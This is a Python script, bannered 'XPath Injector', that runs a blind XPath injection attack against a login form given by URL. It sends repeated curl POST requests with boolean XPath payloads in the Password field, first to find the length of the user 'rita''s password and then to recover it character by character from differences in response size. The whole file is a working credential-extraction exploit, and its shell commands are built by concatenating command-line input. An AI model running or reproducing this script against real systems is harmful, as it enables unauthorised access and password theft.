import sys 
import argparse
import os,subprocess

print("\n\n")
#----------------------------------------------------------------------------
print("__   _______      _   _       _____       _           _             ")          
print("\ \ / /  __ \    | | | |     |_   _|     (_)         | |            ")             
print(" \ V /| |__) |_ _| |_| |__     | |  _ __  _  ___  ___| |_ ___  _ __ ")   
print("  > < |  ___/ _` | __| '_ \    | | | '_ \| |/ _ \/ __| __/ _ \| '__|")   
print(" / . \| |  | (_| | |_| | | |  _| |_| | | | |  __/ (__| || (_) | |   ")   
print("/_/ \_\_|   \__,_|\__|_| |_| |_____|_| |_| |\___|\___|\__\___/|_|   ")   
print("                                        _/ |                        ") 
print("                                       |__/                         ")
#----------------------------------------------------------------------------

pwd={}
dic={}
name = ["rita"]
op=[]
p=" "
url=" "

if "-p" in sys.argv:
	index=sys.argv.index("-p")
	p="-x "+sys.argv[index+1]

if "-url" in sys.argv:
	index=sys.argv.index("-url")
	url=sys.argv[index+1]

def passwd_len():
     for i in name:
            print ('[x] Finding password length for {name}'.format(name=str(i)))
            l = 0
            x = 0
            prev=0
            while True:
                print('[x] Trying Password length..{number}'.format(number=l),end='\r')
                y = "curl -s -D - "+ p + " -X POST -d "+ "\"Username=&Password=' or Username=\'"+ str(i) +"\' and string-length(Password)='" + str(l) + " \" " + url + " | wc -c"  
                x = os.popen(y).read()
                if(prev!=x and l!=0):
                   op.append(l)	
                   break
                prev=x
                l += 1
     j=0
     for i in name:
            dic[i]=op[j]
            j+=1
     print(dic) 

def passwd():
    for i in dic.keys():
        print("\n")
        l = dic[i]
        pas=""
        pos = 0
        prev = 0
        while (l+1):
            charset= [' ', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '_', '-', '+', '=', '{', '}', '[', ']', '|', ':', ';', '"', "'", '>', '<', ',', '.', '/', '?', '~']
            for j in charset:
                print("[x]Try password for {name} as {char} in position {pos}".format(name=i,char=j,pos=pos),end="\r")
               
                y = "curl -s -D - " + p + " -X POST -d \"Username=&Password=' or Username='"+ str(i) +"' and substring(Password,"+str(pos)+",1)='"+str(j) +"\" "+ url + " | wc -c"
               	
                x =  os.popen(y).read()
		
             
                if(prev!=x and pos!=0):
                    pas+=j[0]
                    break
                prev = x
                if(pos==0):
                    break

            pos +=1
            l-= 1
            if l ==0:
                pwd[i] = pas
    print("\n")
    print(pwd)

if url!=" ":
	passwd_len()
	passwd()
else:
	print(" Enter -url http://xx.xx.xx.xx and -p for Proxy if required")	

 